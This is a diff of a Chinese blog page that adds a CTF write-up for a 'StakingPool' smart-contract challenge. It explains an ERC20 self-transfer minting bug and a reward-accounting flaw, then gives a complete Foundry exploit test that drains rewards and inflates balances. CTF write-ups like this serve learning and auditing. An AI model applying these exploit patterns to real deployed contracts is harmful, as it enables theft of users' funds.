@@ -345,21 +345,21 @@ Achilles目标要我们获取至少100ether的weth。
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-10-03
+                    2023-10-04
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1k
+                    1.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    6 分
                 </div>
                 
 
@@ -617,6 +617,60 @@ contract Solver {
         }
 
         return arr;
+    }
+}
+</code></pre>
+<h1 id="StakingPool"><a href="#StakingPool" class="headerlink" title="StakingPool"></a>StakingPool</h1><h2 id="目标-2"><a href="#目标-2" class="headerlink" title="目标"></a>目标</h2><p>要求我们的账户rewardToken余额为 1e8 * 1e18，rewardToken2余额大于 1e8 * 1e18。</p>
+<h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>以共有3种token，其中stakedToken、rewardToken为标准的ERC20，rewardToken2<br>为ERC20V2，通过审查不难发现调ERC20V2的_transfer()方法时，当from=to时，from会凭空产生token。</p>
+<p>再看StakingPool，在调合约的withdraw()和deposit()方法时，会自动领取奖励，因为这样可以保证上次领取的时间到这次领取(存款改变前)、以及下次领取和这次领取(存款改变后)的用户存款量是一致的。但是合约中的transfer()方法将这种设计破坏了。</p>
+<h2 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h2><pre><code>pragma solidity ^0.8.0;
+
+import {Test} from "forge-std/Test.sol";
+import {StakingPools, StakingPoolsDeployment, ERC20} from "../src/StakingPool/StakingPoolsDeployment.sol";
+
+contract StakingPoolTest is Test {
+    StakingPoolsDeployment private deployer;
+
+    function setUp() external {
+        deployer = new StakingPoolsDeployment();
+        deployer.faucet();
+    }
+
+    function test_hackStakingPool() external {
+        solveStageA();
+        solveStageB();
+        assertTrue(deployer.isSolved());
+    }
+
+    function solveStageA() private {
+        StakingPools pool = deployer.stakingPools();
+
+        uint256 amount = 1;
+        pool.stakedToken().approve(address(pool), amount);
+        pool.deposit(amount);
+
+        vm.roll(pool.stakingEndBlock());
+
+        address secondAddress = address(0xdeadbeef); 
+        ERC20 token = deployer.rewardToken();
+
+        while (token.balanceOf(address(pool)) != 0) {
+            pool.withdraw(0);
+            pool.transfer(secondAddress, amount);
+            pool.emergencyWithdraw();
+
+            vm.prank(secondAddress);
+            pool.transfer(address(this), amount);
+        }
+    }
+
+    function solveStageB() private {
+        ERC20 token = deployer.rewardToken2();
+
+        while (!deployer.stageB()) {
+            uint256 balance = token.balanceOf(address(this));
+            token.transfer(address(this), balance);
+        }
     }
 }
 </code></pre>
@@ -1067,7 +1121,7 @@ contract Solver {
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">15.9k</span>
+                        class="white-color">16.6k</span>
             
             
             
